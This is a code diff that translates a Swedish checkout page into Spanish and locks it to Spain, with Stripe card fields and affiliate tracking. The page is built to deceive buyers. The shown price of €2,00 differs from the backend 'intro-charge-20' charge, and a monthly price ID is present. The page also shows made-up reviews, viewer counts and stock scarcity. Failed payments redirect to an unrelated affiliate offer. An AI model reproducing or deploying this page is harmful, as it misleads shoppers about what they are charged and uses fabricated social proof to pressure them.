@@ -1,11 +1,9 @@
 <!DOCTYPE html>
-<html lang="sv">
+<html lang="es">
 <head>
   <meta charset="utf-8" />
   <meta name="viewport" content="width=device-width, initial-scale=1, viewport-fit=cover" />
-  <title>Säker kassa</title>
-  <!-- Prevent leaking full URLs to third parties -->
-  <meta name="referrer" content="no-referrer">
+  <title>Pago seguro</title>
 
   <!-- Google tag (unchanged) -->
   <script async src="https://www.googletagmanager.com/gtag/js?id=G-FDQ6REQWS8"></script>
@@ -32,12 +30,10 @@
 
     .wrap{max-width:1100px; margin:0 auto; padding:18px 14px 60px}
 
-    /* Top safe strip */
     .safe{
       background:#0a0a0a; color:#fff; font-size:12px; padding:6px 10px; text-align:left;
     }
 
-    /* Two-column layout like the screenshot */
     .grid{
       display:grid; grid-template-columns: minmax(0,1fr) 360px; gap:18px; align-items:start;
     }
@@ -77,7 +73,6 @@
     .err{ display:none; background:#fff1f1; border:1px solid #f5bcbc; color:#9a1a1a; padding:10px; border-radius:10px; font-size:14px; margin-top:10px }
     .err[aria-hidden="false"]{ display:block }
 
-    /* Right column widgets */
     .widget{ background:#fff; border:1px solid var(--line); border-radius:12px; padding:16px }
     .widget + .widget{ margin-top:12px }
     .w-title{ font-weight:800; font-size:16px; margin:2px 0 10px }
@@ -96,14 +91,11 @@
     .trust .big{ font-weight:900; font-size:18px }
     .trust .small{ font-size:12px; color:#5b6b82 }
 
-    /* Steps (Information / Payment) */
     .step{ display:none }
     .step[aria-hidden="false"]{ display:block }
 
-    /* Stripe element shell to look native */
     .el{ padding:10px 12px; border-radius:10px; border:1px solid #cfd6e4 }
 
-    /* Loading overlay */
     .loading-overlay{ position:fixed; inset:0; background:rgba(246,249,252,.92);
       display:none; align-items:center; justify-content:center; z-index:9999; }
     .loading-overlay[aria-hidden="false"]{ display:flex }
@@ -116,13 +108,13 @@
   </style>
 </head>
 <body>
-  <div class="safe">SSL-säker betalning</div>
+  <div class="safe">Pago SSL seguro</div>
 
   <div class="wrap">
     <div class="page-title">
-      Säker kassa <span style="font-size:18px">🔒</span>
+      Pago seguro <span style="font-size:18px">🔒</span>
       <span class="stars">★★★★★</span>
-      <span class="reviews">(2777 recensioner)</span>
+      <span class="reviews">(2777 reseñas)</span>
     </div>
 
     <div class="grid">
@@ -136,61 +128,63 @@
             <div id="heroTitle" style="font-weight:900"></div>
           </div>
 
-          <div class="h2">1. Information</div>
+          <div class="h2">1. Información</div>
 
           <div class="form-grid">
             <div>
-              <div class="label">Förnamn</div>
-              <input id="firstName" class="input" placeholder="Jane" autocomplete="given-name">
+              <div class="label">Nombre</div>
+              <input id="firstName" class="input" placeholder="Ana" autocomplete="given-name">
             </div>
             <div>
-              <div class="label">Efternamn</div>
-              <input id="lastName" class="input" placeholder="Doe" autocomplete="family-name">
+              <div class="label">Apellidos</div>
+              <input id="lastName" class="input" placeholder="García" autocomplete="family-name">
             </div>
           </div>
 
           <div class="form-grid">
             <div style="grid-column:1 / -1">
-              <div class="label">Adress</div>
-              <input id="billingStreet" class="input" autocomplete="address-line1" placeholder="Adress">
+              <div class="label">Dirección</div>
+              <input id="billingStreet" class="input" autocomplete="address-line1" placeholder="Dirección (España)">
             </div>
             <div>
-              <div class="label">Postnummer</div>
-              <input id="billingPostcode" class="input" autocomplete="postal-code" placeholder="Postnummer">
+              <div class="label">Código postal</div>
+              <input id="billingPostcode" class="input" autocomplete="postal-code" placeholder="Código postal">
             </div>
             <div>
-              <div class="label">Stad</div>
-              <input id="billingCity" class="input" autocomplete="address-level2" placeholder="Stad">
-            </div>
-          </div>
-
-          <div class="form-grid">
-            <div>
-              <div class="label">E-post</div>
-              <input id="emailInput" class="input" placeholder="du@example.com" type="email" autocomplete="email" required>
-            </div>
-            <div>
-              <div class="label">Land</div>
-              <!-- free text to keep your country→ISO conversion -->
-              <input id="billingCountry" class="input" placeholder="Land">
+              <div class="label">Ciudad</div>
+              <input id="billingCity" class="input" autocomplete="address-level2" placeholder="Ciudad">
             </div>
           </div>
 
           <div class="form-grid">
             <div>
-              <div class="label">Landskod</div>
-              <select id="phonePrefix" class="select" aria-label="Landskod"></select>
+              <div class="label">Correo electrónico</div>
+              <input id="emailInput" class="input" placeholder="tú@ejemplo.com" type="email" autocomplete="email" required>
             </div>
             <div>
-              <div class="label">Telefonnummer</div>
-              <input id="phoneNumber" class="input" inputmode="tel" placeholder="Ditt nummer" autocomplete="tel-national">
+              <div class="label">País</div>
+              <!-- Solo España, de solo lectura -->
+              <input id="billingCountry" class="input" placeholder="España" value="España" readonly>
+            </div>
+          </div>
+
+          <div class="form-grid">
+            <div>
+              <div class="label">Prefijo internacional</div>
+              <select id="phonePrefix" class="select" aria-label="Prefijo internacional">
+                <option value="+34">+34 — España</option>
+              </select>
+            </div>
+            <div>
+              <div class="label">Número de teléfono</div>
+              <input id="phoneNumber" class="input" inputmode="tel" placeholder="Tu número" autocomplete="tel-national">
             </div>
           </div>
 
           <!-- Hidden full name field (keeps your existing payment code exactly the same) -->
           <input id="nameInput" class="input" style="display:none">
 
-          <button id="nextBtn" class="btn" type="button">Fortsätt</button>
+          <button id="nextBtn" class="btn">Continuar</button>
 
           <div class="logos">
             <img src="/visa.png" alt="Visa">
@@ -202,17 +196,17 @@
 
         <!-- STEP 2: Payment -->
         <section id="step2" class="step" aria-hidden="true">
-          <div class="h2">2. Betalning</div>
-          <p class="sub">Kortuppgifterna krypteras och behandlas av Stripe.</p>
+          <div class="h2">2. Pago</div>
+          <p class="sub">Los datos de tu tarjeta se cifran y son procesados por Stripe.</p>
 
           <div class="form-grid-1">
             <div>
-              <div class="label">Kortnummer</div>
+              <div class="label">Número de tarjeta</div>
               <div id="card-number" class="el"></div>
             </div>
             <div class="form-grid">
               <div>
-                <div class="label">Giltigt till</div>
+                <div class="label">Vencimiento</div>
                 <div id="card-expiry" class="el"></div>
               </div>
               <div>
@@ -225,22 +219,22 @@
           <div id="err" class="err" role="alert" aria-hidden="true"></div>
 
           <div style="display:flex; gap:10px; margin-top:12px">
-            <button id="backBtn" class="btn muted" style="width:40%" type="button">← Tillbaka</button>
-            <button id="payNow" class="btn" style="width:60%" type="button">Betala säkert</button>
+            <button id="backBtn" class="btn muted" style="width:40%">← Volver</button>
+            <button id="payNow" class="btn" style="width:60%">Pagar de forma segura</button>
           </div>
 
-          <p class="sub" style="text-align:center; margin-top:10px">🔒 256-bitars SSL-skydd · Drivs av Stripe</p>
+          <p class="sub" style="text-align:center; margin-top:10px">🔒 Cifrado SSL de 256 bits · Con tecnología de Stripe</p>
         </section>
       </div>
 
       <!-- RIGHT: SIDEBAR -->
       <aside>
         <div class="widget">
-          <div class="w-title" style="text-align:center">Vad våra kunder säger</div>
+          <div class="w-title" style="text-align:center">Lo que opinan nuestros clientes</div>
           <div style="text-align:center; font-weight:700; margin-bottom:4px">Fenella Lara</div>
           <div style="text-align:center; color:#f6b80c; letter-spacing:1px">★★★★★</div>
           <p class="tiny" style="text-align:center; margin-top:8px">
-            Jag fick min produkt igår. Snabb och fantastisk kundservice! Tack så mycket.
+            Recibí mi producto ayer. ¡Envío rápido y atención al cliente excelente! Muchas gracias.
           </p>
         </div>
 
@@ -248,37 +242,37 @@
           <div class="delivery">
             <img id="sidebarImg" alt="">
             <div>
-              <div style="font-weight:800">Snabb leverans till din adress</div>
-              <div class="tiny">3–5 arbetsdagar</div>
+              <div style="font-weight:800">Envío rápido a tu dirección</div>
+              <div class="tiny">3–5 días laborables</div>
             </div>
             <div style="margin-left:auto; font-weight:800">Gratis</div>
           </div>
 
-          <div class="w-title" style="margin-top:14px">Orderöversikt</div>
-          <div class="order-row"><span>Totalt</span><span id="orderTotal">21,98 kr</span></div>
+          <div class="w-title" style="margin-top:14px">Resumen del pedido</div>
+          <div class="order-row"><span>Total</span><span id="orderTotal">€2,00</span></div>
 
           <div class="tiny" style="margin-top:10px; line-height:1.5">
-            🗃️ Endast 13 kvar i lager<br>
-            👀 <span id="viewingNow">31</span> personer tittar på detta just nu<br>
-            ✅ <span id="recentBuyer">J****s</span> fick detta (för 10 minuter sedan)<br>
-            💳 <span id="purchasedCount">715</span> personer köpte detta de senaste 7 dagarna
+            🗃️ Solo quedan 13 en stock<br>
+            👀 <span id="viewingNow">31</span> personas viendo esto ahora mismo<br>
+            ✅ <span id="recentBuyer">J****s</span> lo compró (hace 10 minutos)<br>
+            💳 <span id="purchasedCount">715</span> personas lo compraron en los últimos 7 días
           </div>
         </div>
 
         <div class="widget">
-          <div class="w-title">BETRODD BUTIK</div>
+          <div class="w-title">TIENDA DE CONFIANZA</div>
           <div class="trust">
             <div class="box">
               <div class="big">99%</div>
-              <div class="small">Nöjda kunder</div>
+              <div class="small">Clientes satisfechos</div>
             </div>
             <div class="box">
-              <div class="big">Säker</div>
-              <div class="small">SSL-krypterad</div>
+              <div class="big">Seguro</div>
+              <div class="small">Cifrado SSL</div>
             </div>
             <div class="box">
               <div class="big">$10K</div>
-              <div class="small">Köparskydd</div>
+              <div class="small">Protección del comprador</div>
             </div>
           </div>
         </div>
@@ -289,9 +283,9 @@
   <!-- Loading overlay -->
   <div id="loading-overlay" class="loading-overlay" aria-hidden="true" style="display:none">
     <div class="loading-box">
-      <div class="loading-title">Bearbetar din betalning…</div>
+      <div class="loading-title">Procesando tu pago…</div>
       <div class="progress-wrap"><div class="progress-bar"></div></div>
-      <p class="sub" style="margin-top:10px">Vänligen vänta, detta kan ta några sekunder.</p>
+      <p class="sub" style="margin-top:10px">Espera unos segundos, por favor.</p>
     </div>
   </div>
 
@@ -315,37 +309,37 @@
 
       const billingStreet = document.getElementById('billingStreet');
       const billingCity = document.getElementById('billingCity');
-      const billingCountry = document.getElementById('billingCountry'); // free text
+      const billingCountry = document.getElementById('billingCountry'); // España fija
       const billingPostcode = document.getElementById('billingPostcode');
 
       const orderTotal = document.getElementById('orderTotal');
       const sidebarImg = document.getElementById('sidebarImg');
 
-      // Keep your existing endpoints / keys (UNCHANGED)
+      // Endpoints / claves (SIN CAMBIOS)
       const SUBSCRIBE_URL = "https://charmr-jfmc.onrender.com/api/stripe/intro-charge-20";
       const PUBLISHABLE_KEY = "pk_live_51Rhm4sEJXIhiKzYGIPVjXwZTzuKmqU7EOA6EpDIkrNTmtm4ooWHbDcSaBlyglSdJYhCyU4VgcI8Qo09Acc8upCUD00ekSRuN4q";
-      const FIXED_PRICE_ID = "price_1Rzdp0EJXIhiKzYGlVxHGH7W"; // retained (unused)
+      const FIXED_PRICE_ID = "price_1Rzdp0EJXIhiKzYGlVxHGH7W"; // no usado
       const API_BASE = (location.protocol.startsWith('http') ? location.origin : 'http://localhost:10000');
       const MONTHLY_PRICE_ID = "price_1RvJmqEJXIhiKzYGE0IJQp7t";
 
-      // Display price like screenshot (purely cosmetic)
-      const INTRO_PRICE_TEXT = '21,98 kr';
+      // Mostrar precio como €2,00
+      const INTRO_PRICE_TEXT = '€2,00';
       try { orderTotal.textContent = INTRO_PRICE_TEXT; } catch {}
 
       function show(o){ o?.setAttribute('aria-hidden','false'); }
       function hide(o){ o?.setAttribute('aria-hidden','true'); }
 
-      // Loading overlay
+      // Capa de carga
       const overlay = document.getElementById('loading-overlay');
       function showLoading(){ overlay.style.display='flex'; overlay.setAttribute('aria-hidden','false'); }
       function hideLoading(){ overlay.setAttribute('aria-hidden','true'); overlay.style.display='none'; }
       hideLoading();
 
-      // ===== Dynamic title + image via URL (affiliate-supplied) =====
+      // Héroe dinámico por URL (igual que antes)
       (function hydrateHeroFromURL(){
         const qs = new URLSearchParams(window.location.search);
         const title = qs.get('sub1') || qs.get('title') || qs.get('t') || '';
-        const imgUrlRaw = qs.get('sub2') || qs.get('img') || qs.get('image') || '';
+               const imgUrlRaw = qs.get('sub2') || qs.get('img') || qs.get('image') || '';
 
         const hero = document.getElementById('hero');
         const heroTitle = document.getElementById('heroTitle');
@@ -358,7 +352,7 @@
             const decoded = decodeURIComponent(imgUrlRaw);
             if (/^https?:\/\//i.test(decoded)){
               heroImg.src = decoded;
-              sidebarImg.src = decoded;            // show the same “box” image on the right
+              sidebarImg.src = decoded;
               showHero = true;
             }
           }catch{}
@@ -366,169 +360,27 @@
         if (showHero) hero.style.display = 'flex';
       })();
 
-      // ===== Country choices + calling codes =====
-      const COUNTRY_CHOICES = {
-        SE:'Sverige'
-      };
-      const CALLING_CODES = {
-        SE:'+46'
-      };
-      function populatePrefixOptions(){
-        phonePrefix.innerHTML = '';
-        const priority = ['SE'];
-        const seen = new Set();
-        const add = (cc) => {
-          if (seen.has(cc) || !CALLING_CODES[cc]) return;
-          seen.add(cc);
-          const code = CALLING_CODES[cc];
-          const label = `${code} — ${COUNTRY_CHOICES[cc] || cc}`;
-          phonePrefix.append(new Option(label, code));
-        };
-        priority.forEach(add);
-        Object.keys(CALLING_CODES).filter(cc => !priority.includes(cc)).sort().forEach(add);
-        if (!phonePrefix.value) phonePrefix.value = CALLING_CODES.SE;
-      }
-      function setPrefixFromISO(cc){ const code = CALLING_CODES[cc]; if(!code) return;
-        const exists = Array.from(phonePrefix.options).some(o=>o.value===code);
-        if(!exists) phonePrefix.add(new Option(`${code} — ${COUNTRY_CHOICES[cc]||cc}`, code));
-        phonePrefix.value = code;
-      }
-      function setPrefixValue(code){
-        if(!phonePrefix || !code) return;
-        let c = String(code).trim(); if(!c.startsWith('+')) c = '+' + c.replace(/[^\d]/g,'');
-        const exists = Array.from(phonePrefix.options).some(o=>o.value===c);
-        if(!exists) phonePrefix.add(new Option(c, c));
-        phonePrefix.value = c;
-      }
-      function normalizeCountryShorthand(val){
-        const v = String(val||'').toUpperCase().replace(/\./g,'').trim();
-        const map = { UK:'GB', ENGLAND:'GB', SCOTLAND:'GB', WALES:'GB', USA:'US', UNITEDSTATES:'US', UAE:'AE', KSA:'SA' };
-        return map[v] || null;
-      }
-      function countryTextToISO(text){
-        if(!text) return null;
-        const raw = text.trim(); const isoLike = raw.toUpperCase();
-        if (isoLike.length === 2 && COUNTRY_CHOICES[isoLike]) return isoLike;
-        const shorthand = normalizeCountryShorthand(raw); if (shorthand && COUNTRY_CHOICES[shorthand]) return shorthand;
-        const lower = raw.toLowerCase();
-        let match = Object.entries(COUNTRY_CHOICES).find(([code,name]) => name.toLowerCase() === lower);
-        if(!match){ match = Object.entries(COUNTRY_CHOICES).find(([code,name]) => name.toLowerCase().startsWith(lower)); }
-        return match ? match[0] : null;
-      }
-      populatePrefixOptions();
-
-      // ===== URL prefill (updated mapping) =====
-      const qs = new URLSearchParams(window.location.search);
-      const urlPrefs = {
-        first:   qs.get('sub3') || '',
-        last:    qs.get('sub4') || '',
-        street:  qs.get('sub5') || '',
-        post:    qs.get('sub6') || '',
-        city:    qs.get('sub7') || '',
-        country: qs.get('sub8') || '',
-        email:   qs.get('sub9') || '',
-        phone:   qs.get('sub10') || ''
-      };
-
-      // will prevent IP from overriding if we already set a prefix from URL
-      let prefixLockedFromURL = false;
-
-      function applyContactPrefill(){
-        if (urlPrefs.first){ firstName.value = decodeURIComponent(urlPrefs.first); }
-        if (urlPrefs.last){  lastName.value  = decodeURIComponent(urlPrefs.last); }
-        if (urlPrefs.email){ document.getElementById('emailInput').value = decodeURIComponent(urlPrefs.email); }
-
-        const rawPhone = (urlPrefs.phone || '').trim();
-        if (rawPhone){
-          if (rawPhone.startsWith('+')){
-            const digits = rawPhone.replace(/[^\d]/g,'');
-            const m = digits.match(/^(\d{1,4})(\d{4,15})$/);
-            if (m){ setPrefixValue('+'+m[1]); phoneNumber.value = m[2]; prefixLockedFromURL = true; }
-            else { phoneNumber.value = digits; }
-          } else {
-            phoneNumber.value = rawPhone.replace(/[^\d]/g,'');
+      // ===== Solo España (+34) =====
+      function lockToSpain(){
+        if (billingCountry) billingCountry.value = 'España';
+        if (phonePrefix){
+          if (!Array.from(phonePrefix.options).some(o => o.value === '+34')) {
+            phonePrefix.add(new Option('+34 — España', '+34'));
           }
+          phonePrefix.value = '+34';
         }
       }
+      lockToSpain();
+      setTimeout(lockToSpain, 0); // por si alguna lógica externa intenta cambiarlo
 
-      function applyAddressPrefill(){
-        if (urlPrefs.street){ billingStreet.value = decodeURIComponent(urlPrefs.street); }
-        if (urlPrefs.post){   billingPostcode.value = decodeURIComponent(urlPrefs.post); }
-        if (urlPrefs.city){   billingCity.value = decodeURIComponent(urlPrefs.city); }
-        if (urlPrefs.country){
-          const text = decodeURIComponent(urlPrefs.country);
-          billingCountry.value = text;
-          const iso = countryTextToISO(text);
-          if (iso) setPrefixFromISO(iso);
-        }
-      }
-
-      applyContactPrefill();
-      applyAddressPrefill();
-
-      // ---- IP-based prefix ONLY (does not touch city/country fields) ----
-      (function hydratePrefixFromIP(){
-        if (prefixLockedFromURL) return; // respect URL-provided phone
-        const withTimeout = (ms,p)=>Promise.race([p,new Promise((_,rej)=>setTimeout(()=>rej(new Error('timeout')),ms))]);
-        const guessISO = ()=>{ const cc=(navigator.language||'').split('-')[1]; return cc?cc.toUpperCase():null; };
-        (async () => {
-          try{
-            const try1=()=>withTimeout(2000, fetch('https://ipapi.co/json/').then(r=>r.json()));
-            const try2=()=>withTimeout(2000, fetch('https://ipwho.is/?fields=country,country_code').then(r=>r.json()));
-            const try3=()=>withTimeout(2000, fetch('https://ipinfo.io/json').then(r=>r.json()));
-            let d=null; try{ d=await try1(); }catch{} if(!d||d.error){ try{ d=await try2(); }catch{} } if(!d||d.error){ try{ d=await try3(); }catch{} }
-            let iso = (d && (d.country_code || d.countryCode)) ? String(d.country_code || d.countryCode).toUpperCase() : null;
-            if(!iso) iso = guessISO();
-            if(iso) setPrefixFromISO(iso);
-          }catch{
-            const iso = guessISO();
-            if(iso) setPrefixFromISO(iso);
-          }
-        })();
-      })();
-
-      // Sync prefix when user edits country
-      function maybeSyncPrefixFromCountry(){
-        const iso = countryTextToISO(billingCountry.value);
-        if (iso) setPrefixFromISO(iso);
-      }
-      billingCountry.addEventListener('change', maybeSyncPrefixFromCountry);
-      billingCountry.addEventListener('blur',   maybeSyncPrefixFromCountry);
-
-      // =========================
-      // ADSCURB DSP: load real script tag on Step 1 only
-      // =========================
-      const ADSCURB_SRC = "https://adscurb.co/tag/analytics.js";
-      function mountAdscurb(){
-        if (document.getElementById('adscurb-sdk')) return;
-        const s = document.createElement('script');
-        s.src = ADSCURB_SRC;
-        s.async = true;
-        s.id = 'adscurb-sdk';
-        document.head.appendChild(s);
-      }
-      function unmountAdscurb(){
-        const s = document.getElementById('adscurb-sdk');
-        if (s) s.remove();
-      }
-      // If Step 1 is showing at load → mount
-      if (step1 && step1.getAttribute('aria-hidden') === 'false'){ mountAdscurb(); }
-
-      // Step navigation — combine first/last into hidden full name for Stripe
+      // Navegación de pasos
       nextBtn?.addEventListener('click', () => {
-        // BEFORE showing Step 2, remove adscurb
-        unmountAdscurb();
-
         nameInput.value = [firstName.value || '', lastName.value || ''].join(' ').trim();
         hide(step1); show(step2);
       });
-      backBtn?.addEventListener('click', ()=>{
-        // User returns to Step 1 → mount adscurb again
-        mountAdscurb();
-        hide(step2); show(step1);
-      });
+      backBtn?.addEventListener('click', ()=>{ hide(step2); show(step1); });
 
-      // ===== Stripe (kept) =====
+      // ===== Stripe (sin cambios) =====
       let stripe, elements, cardNumber, cardExpiry, cardCvc;
       try{
         if(window.Stripe){
@@ -544,7 +396,7 @@
       }catch(e){ console.warn('Stripe init skipped:', e); }
 
       document.getElementById('payNow')?.addEventListener('click', async ()=>{
-        if(!stripe){ alert('Betalning är tillfälligt otillgänglig. Försök igen.'); return; }
+        if(!stripe){ alert('Pago temporalmente no disponible. Inténtalo de nuevo.'); return; }
         errBox?.setAttribute('aria-hidden','true'); if(errBox) errBox.textContent='';
         showLoading();
 
@@ -553,28 +405,15 @@
         const raw = (phoneNumber?.value || '').replace(/[^0-9]/g,'');
         const fullPhone = raw ? ((phonePrefix?.value||'') + raw) : undefined;
 
-        const isoCountry = (function countryTextToISO(text){
-          if(!text) return null;
-          const raw = text.trim(); const isoLike = raw.toUpperCase();
-          if (isoLike.length === 2 && COUNTRY_CHOICES[isoLike]) return isoLike;
-          const shorthand = (function(v){ v=String(v||'').toUpperCase().replace(/\./g,'').trim();
-            const map={UK:'GB',ENGLAND:'GB',SCOTLAND:'GB',WALES:'GB',USA:'US',UNITEDSTATES:'US',UAE:'AE',KSA:'SA'}; return map[v]||null; })(raw);
-          if (shorthand && COUNTRY_CHOICES[shorthand]) return shorthand;
-          const lower = raw.toLowerCase();
-          let match = Object.entries(COUNTRY_CHOICES).find(([code,name]) => name.toLowerCase() === lower)
-                  || Object.entries(COUNTRY_CHOICES).find(([code,name]) => name.toLowerCase().startsWith(lower));
-          return match ? match[0] : null;
-        })(billingCountry?.value) || undefined;
-
+        // Dirección para Stripe con país ISO ES
         const address = {
           line1: (billingStreet?.value||'').trim() || undefined,
           city: (billingCity?.value||'').trim() || undefined,
-          country: isoCountry,
+          country: 'ES',
           postal_code: (billingPostcode?.value||'').trim() || undefined
         };
 
         try{
-          // 1) Create a PaymentMethod
           const pmRes = await stripe.createPaymentMethod({
             type:'card',
             card:cardNumber,
@@ -582,20 +421,17 @@
           });
           if(pmRes.error) throw new Error(pmRes.error.message);
 
-          // 2) Start the $20 intro charge (kept)
           const resp = await fetch(SUBSCRIBE_URL,{
             method:'POST', headers:{'Content-Type':'application/json'},
             body: JSON.stringify({ paymentMethodId: pmRes.paymentMethod.id, name, email, phone: fullPhone, address })
           });
           const data = await resp.json();
-          if(!data.clientSecret) throw new Error(data.error || 'Betalningen kunde inte startas');
+          if(!data.clientSecret) throw new Error(data.error || 'No se pudo iniciar el pago');
 
-          // 3) Confirm the intro charge (handles 3DS/SCA)
           const conf = await stripe.confirmCardPayment(data.clientSecret);
           if(conf.error) throw new Error(conf.error.message);
-          if(!(conf.paymentIntent && conf.paymentIntent.status==='succeeded')) throw new Error('Betalningen slutfördes inte');
+          if(!(conf.paymentIntent && conf.paymentIntent.status==='succeeded')) throw new Error('El pago no se completó');
 
-          // Success → thank you via BeMob tracker (no split)
           (function(){
             const TRACKER_URL = 'https://cudsr.bemobtrcks.com/go/abc281a7-e82a-411b-8b56-1a0228d7d2e7';
             const pid = (conf && conf.paymentIntent && conf.paymentIntent.id) || data.paymentIntentId || '';
@@ -612,14 +448,22 @@
                 qp.set('tid',     sub);
               }
             }catch(e){}
+
+            /* BEGIN: forward affiliate Meta Pixel ID if present (?pixel=, ?fb_pixel=, or ?fbp=) */
+            try{
+              const srcQs = new URLSearchParams(location.search);
+              const affiliatePixel = srcQs.get('pixel') || srcQs.get('fb_pixel') || srcQs.get('fbp');
+              if (affiliatePixel) qp.set('pixel', affiliatePixel);
+            }catch(e){}
+            /* END: forward affiliate Meta Pixel ID */
+
             const sep = TRACKER_URL.includes('?') ? '&' : '?';
             window.location.href = TRACKER_URL + sep + qp.toString();
           })();
 
         }catch(err){
-          if(errBox){ errBox.textContent = err.message || 'Något gick fel.'; errBox.setAttribute('aria-hidden','false'); }
+          if(errBox){ errBox.textContent = err.message || 'Ha ocurrido un error.'; errBox.setAttribute('aria-hidden','false'); }
           hideLoading();
-          /* ONLY CHANGE: redirect on failure, matching blank.html */
           window.location.href = 'https://www.united-defence-shield.com/7GQSPJ/27CC71Q';
         }
       });
